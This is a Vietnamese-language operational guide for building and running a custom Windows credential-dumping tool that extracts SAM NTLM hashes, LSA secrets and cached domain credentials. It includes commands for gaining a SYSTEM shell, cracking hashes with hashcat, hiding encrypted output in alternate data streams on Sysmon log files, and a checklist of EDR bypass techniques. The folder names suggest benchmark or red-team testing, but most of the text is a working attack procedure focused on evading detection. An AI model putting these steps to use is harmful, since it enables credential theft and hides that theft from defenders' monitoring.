# Plan 2 — SAM + LSA Secrets + Cached Credentials: Hướng dẫn Setup & Chạy thử

> **Target**: T1003.002 (SAM) + T1003.004 (LSA Secrets) + T1003.005 (Cached Domain Credentials)
> **Phương pháp**: Raw NTFS Volume Read + Offline Hive Parse + SysKey Decryption
> **Yêu cầu**: SYSTEM privilege (đã leo quyền thành công)

---

## 1. Yêu cầu môi trường

| Thành phần | Yêu cầu |
|------------|---------|
| **OS** | Windows 10 22H2, Windows 11 23H2, Windows Server 2022 |
| **FS** | NTFS (bắt buộc cho raw volume method) |
| **Disk** | Ổ cứng vật lý (có thể không hoạt động trên ổ ảo hóa snapshot-based) |
| **Quyền** | SYSTEM (Integrity Level 0x4000) |
| **Compiler** | Visual Studio 2022 + Windows SDK 10.0.22621+ |
| **Python** | 3.8+ (cho verify script) |

## 2. Cài đặt môi trường build

### 2.1 Visual Studio 2022

```powershell
# Cài Build Tools nếu chưa có:
winget install Microsoft.VisualStudio.2022.BuildTools --override `
    "--add Microsoft.VisualStudio.Workload.VCTools `
     --add Microsoft.VisualStudio.Component.Windows11SDK.22621 `
     --includeRecommended"
```

### 2.2 Kiểm tra

```powershell
& "C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Auxiliary\Build\vcvars64.bat"
cl.exe /? 2>&1 | Select-Object -First 2
```

---

## 3. Build

### 3.1 Build tự động

```powershell
cd D:\2026\Benchmark_Q3\Prvention\OS_dump\Plan2_SAM_LSA
.\build.bat
```

Output: `SAMLSAExtract.exe`

### 3.2 Build thủ công

```powershell
& "C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Auxiliary\Build\vcvars64.bat"

cl.exe /nologo /O2 /MT /GS- /GL /W3 /WX- /Z7 `
    /D "WIN32_LEAN_AND_MEAN" /D "NDEBUG" /D "_CONSOLE" `
    /Fe"SAMLSAExtract.exe" `
    src\main.c src\ntfs_raw.c src\mft_parser.c src\hive_extractor.c `
    src\sam_parser.c src\security_parser.c src\system_parser.c `
    src\cache_parser.c src\reg_fallback.c src\ads_writer.c src\cleanup.c `
    src\crypto\sha256.c src\crypto\md5.c src\crypto\rc4.c `
    src\crypto\aes256_gcm.c `
    /link /NOLOGO /OPT:REF /OPT:ICF /DYNAMICBASE /NXCOMPAT `
    kernel32.lib ntdll.lib advapi32.lib
```

---

## 4. Setup môi trường test

### 4.1 Tạo SYSTEM shell

```powershell
# Dùng PsExec (Sysinternals)
.\PsExec.exe -s -i -d powershell.exe

# Hoặc scheduled task
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoExit -Command cd D:\2026\Benchmark_Q3\Prvention\OS_dump\Plan2_SAM_LSA"
$principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount
Register-ScheduledTask -TaskName "SYSTEM_Test" -Action $action -Principal $principal -Force
Start-ScheduledTask -TaskName "SYSTEM_Test"
```

### 4.2 Kiểm tra môi trường

```powershell
.\SAMLSAExtract.exe --whoami
```

Kết quả mong đợi:
```
[*] Process ID: 2345
[*] Integrity: SYSTEM
[*] Raw volume access: OK
```

### 4.3 Kiểm tra NTFS volume access

```powershell
# Test quyền đọc raw volume
$vol = [System.IO.File]::Open("\\.\C:", [System.IO.FileMode]::Open, `
    [System.IO.FileAccess]::Read, [System.IO.FileShare]::ReadWrite)
if ($vol) {
    Write-Host "[OK] Raw NTFS volume access available"
    $vol.Close()
} else {
    Write-Host "[WARN] Will use NtSaveKey fallback"
}
```

### 4.4 Chuẩn bị tài khoản test (nếu cần)

```powershell
# Tạo thêm local user để có dữ liệu test đa dạng
net user testuser1 "P@ssw0rd123!" /add
net user testuser2 "S3cur3P@ss!" /add

# Enable auto-logon để có LSA DefaultPassword
# (Chỉ trong môi trường lab!)
# reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" `
#     /v DefaultPassword /t REG_SZ /d "TestAutoLogon" /f

# Login với domain account để có MSCache entries
# runas /user:DOMAIN\username cmd.exe
```

---

## 5. Chạy thử

### 5.1 Chạy full extraction (khuyến nghị)

```powershell
# Trong SYSTEM shell:
.\SAMLSAExtract.exe --dump-all
```

Output mong đợi:
```
┌──────────────────────────────────────────────────────────┐
│  SAM + LSA Secrets + Cached Credentials Dump             │
│  T1003.002/.004/.005 — Raw NTFS + Offline Hive Parse     │
│  Pre-condition: SYSTEM privilege                         │
└──────────────────────────────────────────────────────────┘

[*] Starting SAM + LSA Secrets + Cached Credentials dump...

[1/5] Extracting hives from NTFS volume...
      Volume handle: OK
      Cluster: 4096 bytes | MFT at cluster 786432
      MFT: 134217728 bytes
      SAM       : 65536 bytes, sig: regf
      SECURITY  : 65536 bytes, sig: regf
      SYSTEM    : 17825792 bytes, sig: regf

[2/5] Extracting SysKey from SYSTEM hive... OK (A1B2C3D4E5F60708091A2B3C4D5E6F70)

[3/5] Parsing SAM hive...
      Extracted 5 NTLM hashes

[4/5] Parsing SECURITY hive...
      LSA Secrets: 4 | MSCache v2: 2

[5/5] Encrypting + writing to ADS...
      Encrypted: 8192 bytes
      ADS written: OK

[+] Dump complete.
```

### 5.2 Chế độ extract-only (chỉ lấy hives, không parse)

```powershell
.\SAMLSAExtract.exe --extract-only
# Output: SAM, SECURITY, SYSTEM files trong thư mục hiện tại
```

### 5.3 Parse hives đã extract

```powershell
# Parse từ thư mục
.\SAMLSAExtract.exe --parse-only .
```

### 5.4 Force NtSaveKey fallback

```powershell
# Nếu raw NTFS bị chặn, test fallback:
.\SAMLSAExtract.exe --method-registry --dump-all
```

---

## 6. Verify kết quả

### 6.1 Đọc ADS output

```powershell
$adsPath = "C:\Windows\System32\winevt\Logs\Microsoft-Windows-Sysmon%4Operational.evtx"
$adsName = "Microsoft-Windows-CredentialManager%4Debug"

# Đọc nội dung
cmd /c "more < $adsPath`:$adsName"
```

### 6.2 So sánh với registry thật

```powershell
# Kiểm tra NTLM hash trong SAM (cần SYSTEM)
reg save HKLM\SAM C:\temp\sam_test.hive
reg save HKLM\SECURITY C:\temp\security_test.hive
reg save HKLM\SYSTEM C:\temp\system_test.hive

# Dùng tool khác cross-check (VD: secretsdump từ impacket)
python3 secretsdump.py -sam C:\temp\sam_test.hive `
    -security C:\temp\security_test.hive `
    -system C:\temp\system_test.hive LOCAL

# So sánh kết quả với output của SAMLSAExtract.exe
```

### 6.3 Kiểm tra MSCache entries

```powershell
# MSCache v2 có format: $DCC2$10240#username#domain#hash
# Crack được với hashcat mode 2100

# Export MSCache entries từ output
# Sau đó:
hashcat.exe -m 2100 mscache_hashes.txt wordlist.txt
```

### 6.4 Kiểm tra LSA Secrets

```powershell
# Các LSA secrets quan trọng:
# - DefaultPassword: mật khẩu auto-logon (nếu bật)
# - DPAPI_SYSTEM: backup key cho DPAPI master keys
# - NL$KM: LSA encryption key (dùng để giải mã các secret khác)
# - $MACHINE.ACC: mật khẩu machine account (domain-joined)
```

---

## 7. Chạy test script tự động

```powershell
cd test
.\run_test.ps1

# Với tham số tùy chỉnh:
.\run_test.ps1 -OutputDir "C:\temp\test_results"
```

---

## 8. Cleanup

```powershell
# Xóa hives đã extract (nếu dùng --extract-only)
Remove-Item .\SAM, .\SECURITY, .\SYSTEM -Force -EA SilentlyContinue

# Xóa ADS
$adsPaths = @(
    "C:\Windows\System32\winevt\Logs\Microsoft-Windows-Sysmon%4Operational.evtx:Microsoft-Windows-CredentialManager%4Debug",
    "C:\Windows\System32\winevt\Logs\Application.evtx:Microsoft-Windows-CredentialManager%4Debug"
)
foreach ($p in $adsPaths) {
    Remove-Item $p -Force -EA SilentlyContinue
}

# Xóa saved hives từ registry fallback
Remove-Item "C:\Windows\System32\winevt\Logs\SAM.evtx" -Force -EA SilentlyContinue
Remove-Item "C:\Windows\System32\winevt\Logs\SECURITY.evtx" -Force -EA SilentlyContinue
Remove-Item "C:\Windows\System32\winevt\Logs\SYSTEM.evtx" -Force -EA SilentlyContinue
```

---

## 9. Troubleshooting

| Lỗi | Nguyên nhân | Cách fix |
|-----|-------------|----------|
| `Raw NTFS open failed (0x5)` | Không có SYSTEM quyền | Chạy dưới SYSTEM shell |
| `Not NTFS: "FAT32 "` | Ổ đĩa không phải NTFS | Chỉ hoạt động trên NTFS |
| `Failed to parse NTFS boot sector` | Boot sector bị hỏng hoặc không đọc được | Dùng NtSaveKey fallback |
| `SAM: FAILED / SECURITY: FAILED` | File hive bị lock hoặc không tồn tại | Dùng NtSaveKey fallback |
| `SysKey extraction FAILED` | SYSTEM hive corrupt hoặc thiếu Lsa keys | Kiểm tra registry path |
| `0 NTLM hashes extracted` | SAM hive không có user, hoặc decrypt sai | Kiểm tra SysKey đúng không |
| `MSCache entries: 0` | Chưa có domain user login vào máy | Login với domain account trước khi test |
| `ADS written FAILED` | Không có quyền ghi | Tool tự thử fallback paths |

---

## 10. Bypass Verification Checklist

- [ ] **File API Hook Bypass**: Không gọi `NtOpenFile`/`CreateFileW` đến SAM/SECURITY/SYSTEM paths
- [ ] **NTFS Minifilter Bypass**: EDR không biết cluster nào thuộc file nào (chỉ thấy raw sector reads)
- [ ] **RegSaveKey Hook Bypass**: Không dùng `RegSaveKeyExW`; fallback dùng `NtSaveKey` indirect syscall
- [ ] **File Creation Scan**: Không tạo file mới (output trong ADS)
- [ ] **VSS Detection**: Không tạo Volume Shadow Copy
- [ ] **Encryption**: Output AES-256-GCM, không có plaintext credential trên disk
- [ ] **ADS Monitoring**: ADS ghi vào file hệ thống có sẵn, không tạo file mới
- [ ] **No LSASS Access**: Không cần mở LSASS handle (tất cả qua file system)
